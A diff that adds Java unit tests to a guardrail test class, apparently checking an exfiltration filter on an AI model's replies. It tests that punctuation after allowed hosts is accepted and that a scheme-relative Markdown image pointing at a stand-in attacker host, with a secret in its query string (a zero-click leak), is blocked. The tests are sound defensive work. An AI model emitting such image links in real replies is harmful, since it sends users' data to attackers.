@@ -244,4 +244,43 @@ class GuardrailChainTest {
         assertThat(exfiltration.validate(AiMessage.from("")).isSuccess()).isTrue();
         assertThat(leakage.validate(AiMessage.from("")).isSuccess()).isTrue();
     }
+
+    // ------------------------------------------------------------------
+    // The two ways a URL slips past the host check
+    // ------------------------------------------------------------------
+
+    @Test
+    @DisplayName("a sentence's full stop is not part of the host")
+    void citingAnAllowedSourceAtTheEndOfASentence() {
+        // "brasilapi.com.br." equals no allowed domain and ends with no allowed
+        // suffix, so this withheld an answer for citing a source in the catalogue.
+        var result = exfiltration.validate(AiMessage.from(
+                "O CEP fica na Avenida Paulista. Fonte: https://brasilapi.com.br."));
+
+        assertThat(result.isSuccess()).isTrue();
+    }
+
+    @Test
+    void aCommaAfterAnAllowedHostIsNotPartOfIt() {
+        var result = exfiltration.validate(AiMessage.from(
+                "O verbete está em https://pt.wikipedia.org, que é a fonte desta skill."));
+
+        assertThat(result.isSuccess()).isTrue();
+    }
+
+    @Test
+    @DisplayName("a scheme-relative image is the zero-click payload, not a relative link")
+    void aSchemeRelativeImageIsBlocked() {
+        var result = exfiltration.validate(AiMessage.from(
+                "Aqui está: ![x](//attacker.example/p.png?d=segredo)"));
+
+        assertThat(result.isSuccess()).isFalse();
+    }
+
+    @Test
+    void agenuinelyRelativeLinkStillPasses() {
+        var result = exfiltration.validate(AiMessage.from("Veja [a seção](#limites) abaixo."));
+
+        assertThat(result.isSuccess()).isTrue();
+    }
 }
